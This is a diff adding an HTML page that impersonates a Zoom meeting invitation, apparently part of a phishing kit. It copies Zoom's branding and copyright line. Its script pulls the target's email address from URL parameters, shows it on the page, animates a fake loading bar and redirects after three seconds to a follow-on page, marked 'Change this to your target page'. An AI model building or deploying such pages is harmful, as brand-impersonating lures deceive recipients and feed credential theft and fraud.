@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom Meeting</title>
+    <style>
+        /* Background Image */
+        body {
+            background-image: url('background.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Overlay to ensure readability */
+        .overlay {
+            background-color: rgba(255, 255, 255, 0.85);
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top Navigation Bar - Deep Navy Blue */
+        .top-nav {
+            background-color: #1A1A2E;
+            padding: 8px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            font-size: 13px;
+            color: white;
+            flex-wrap: wrap;
+        }
+        .top-nav-left {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .top-nav-search {
+            margin-right: 15px;
+            color: #A0A0A0;
+        }
+        .top-nav-support {
+            color: white;
+        }
+        .top-nav-right {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .top-nav-link {
+            color: white;
+            margin-left: 15px;
+            text-decoration: none;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+        .top-nav-divider {
+            color: #3D3D4D;
+            margin: 0 8px;
+            font-weight: bold;
+        }
+
+        /* Main Navigation Bar - White */
+        .main-nav {
+            background-color: white;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            flex-wrap: wrap;
+        }
+        .main-nav-link {
+            color: #666;
+            margin: 0 10px;
+            text-decoration: none;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+        .main-nav-link:hover {
+            color: #2D8CFF;
+        }
+        .main-nav-divider {
+            color: #DDD;
+            margin: 0 8px;
+            font-weight: bold;
+        }
+
+        /* Meeting Content */
+        .container {
+            background-color: white;
+            padding: 25px;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            margin: 20px auto;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 15px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #2D8CFF;
+        }
+        .status {
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+        .loading-bar {
+            width: 80%;
+            height: 3px;
+            background-color: #e0e0e0;
+            border-radius: 2px;
+            margin: 0 auto 30px;
+            overflow: hidden;
+        }
+        .loading-progress {
+            height: 100%;
+            width: 0;
+            background-color: #2D8CFF;
+            transition: width 3s linear;
+        }
+        .email {
+            background-color: #f0f0f0;
+            padding: 10px;
+            border-radius: 3px;
+            margin-bottom: 25px;
+            font-family: monospace;
+            word-break: break-all;
+            font-size: 14px;
+        }
+        .passcode {
+            font-weight: bold;
+            margin: 20px 0;
+            font-size: 16px;
+        }
+        .copyright {
+            font-size: 12px;
+            color: #999;
+            margin-top: 30px;
+        }
+
+        /* Logo at top of iframe */
+        .iframe-logo {
+            display: block;
+            margin: 0 auto 20px;
+            max-width: 100px;
+            height: auto;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            .top-nav, .main-nav {
+                padding: 8px 10px;
+            }
+            .top-nav-link, .main-nav-link {
+                margin-left: 8px;
+                font-size: 12px;
+            }
+            .container {
+                padding: 20px 15px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .top-nav-divider, .main-nav-divider {
+                display: none;
+            }
+            .top-nav-left, .top-nav-right {
+                justify-content: center;
+                width: 100%;
+                margin: 5px 0;
+            }
+            .main-nav {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background will be loaded from background.jpg -->
+    <div class="overlay">
+        <!-- Logo at top -->
+        <img src="logo.png" alt="Logo" class="iframe-logo" onerror="this.style.display='none'">
+
+        <!-- Top Navigation -->
+        <div class="top-nav">
+            <div class="top-nav-left">
+                <div class="top-nav-search">Q Search</div>
+                <div class="top-nav-support">Support 1888.799.9666</div>
+            </div>
+            <div class="top-nav-right">
+                <a href="#" class="top-nav-link">RequestaDemo</a>
+                <span class="top-nav-divider">|</span>
+                <a href="#" class="top-nav-link">Join</a>
+                <span class="top-nav-divider">|</span>
+                <a href="#" class="top-nav-link">Host</a>
+                <span class="top-nav-divider">v</span>
+            </div>
+        </div>
+
+        <!-- Main Navigation -->
+        <div class="main-nav">
+            <a href="#" class="main-nav-link">Products</a>
+            <a href="#" class="main-nav-link">Solutions</a>
+            <span class="main-nav-divider">©</span>
+            <a href="#" class="main-nav-link">Resources</a>
+            <span class="main-nav-divider">—</span>
+            <a href="#" class="main-nav-link">Plans & pricing</a>
+        </div>
+
+        <!-- Meeting Content -->
+        <div class="container">
+            <div class="logo" id="dynamicLogo"></div>
+            <h1>Zoom Meeting</h1>
+            <div class="status">Your meeting is ready to join</div>
+            
+            <div class="loading-bar">
+                <div class="loading-progress" id="loadingBar"></div>
+            </div>
+            
+            <div class="email" id="recipientEmail">To: participant.name@company.com</div>
+            <div class="passcode">Join with Meeting Passcode</div>
+            <div class="copyright">
+                Copyright © 2023 Zoom Video Communications. All rights reserved. 
+                [Terms of Service, Privacy Policy]
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Dynamic logo configuration
+            const logoUrl = 'logo.png'; // Assuming logo is in same directory
+            const logoElement = document.getElementById('dynamicLogo');
+            
+            if (logoUrl) {
+                logoElement.style.backgroundImage = `url('${logoUrl}')`;
+                logoElement.onerror = function() {
+                    this.style.backgroundImage = 'none';
+                    this.innerHTML = `
+                        <svg viewBox="0 0 24 24" fill="#2D8CFF">
+                            <path d="M22 12a10 10 0 1 1-20 0 10 10 0 0 1 20 0zm-6.6-1.5h-2.1v5.2c0 .8-.7 1.5-1.5 1.5s-1.5-.7-1.5-1.5v-5.2H8.6c-.8 0-1.5-.7-1.5-1.5s.7-1.5 1.5-1.5h2.1V4.8c0-.8.7-1.5 1.5-1.5s1.5.7 1.5 1.5v4.2h2.1c.8 0 1.5.7 1.5 1.5s-.7 1.5-1.5 1.5z"/>
+                        </svg>
+                    `;
+                };
+            }
+            
+            // Start loading bar animation
+            const loadingBar = document.getElementById('loadingBar');
+            setTimeout(() => {
+                loadingBar.style.width = '100%';
+            }, 10);
+            
+            // Email extraction
+            const urlParams = new URLSearchParams(window.location.search);
+            const possibleKeys = ['email', 'e', 'recipient', 'to'];
+            let recipientEmail = null;
+            
+            for (const key of possibleKeys) {
+                if (urlParams.has(key)) {
+                    recipientEmail = decodeURIComponent(urlParams.get(key));
+                    break;
+                }
+            }
+            
+            if (recipientEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(recipientEmail)) {
+                document.getElementById('recipientEmail').textContent = 'To: ' + recipientEmail;
+            }
+
+            // Redirect after 3 seconds to another page in same directory
+            setTimeout(function() {
+                window.location.href = 'zoom.html'; // Change this to your target page
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
